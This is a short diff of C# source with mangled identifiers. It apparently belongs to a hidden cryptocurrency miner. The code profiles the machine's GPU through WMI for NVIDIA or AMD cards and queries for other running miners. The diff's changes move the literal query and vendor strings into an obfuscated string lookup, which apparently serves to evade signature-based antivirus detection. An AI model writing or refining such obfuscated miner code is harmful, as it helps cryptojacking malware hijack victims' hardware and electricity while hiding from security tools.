@@ -47,16 +47,16 @@ public partial class _rProgram_
             string _rarg1_ = "";
             var _rarg4_ = new ConnectionOptions();
             _rarg4_.Impersonation = ImpersonationLevel.Impersonate;
-            var _rarg5_ = new ManagementScope(@"\root\cimv2", _rarg4_);
+            var _rarg5_ = new ManagementScope(_rGetString_("#WMISCOPE"), _rarg4_);
             _rarg5_.Connect();
 
-            var rarg6 = new ManagementObjectSearcher(_rarg5_, new ObjectQuery("SELECT Name, VideoProcessor FROM Win32_VideoController")).Get();
+            var rarg6 = new ManagementObjectSearcher(_rarg5_, new ObjectQuery(_rGetString_("#GPUQUERY"))).Get();
             foreach (ManagementObject MemObj in rarg6)
             {
                 _rarg1_ += (" " + MemObj["VideoProcessor"] + " " + MemObj["Name"]);
             }
 
-            bool _rarg2_ = _rarg1_.IndexOf("nvidia", StringComparison.OrdinalIgnoreCase) >= 0 || _rarg1_.IndexOf("amd", StringComparison.OrdinalIgnoreCase) >= 0;
+            bool _rarg2_ = _rarg1_.IndexOf(_rGetString_("#STRNVIDIA"), StringComparison.OrdinalIgnoreCase) >= 0 || _rarg1_.IndexOf(_rGetString_("#STRAMD"), StringComparison.OrdinalIgnoreCase) >= 0;
 
             string _rminers_ = "";
             var _rarg7_ = new ManagementObjectSearcher(_rarg5_, new ObjectQuery(_rGetString_("#MINERQUERY"))).Get();
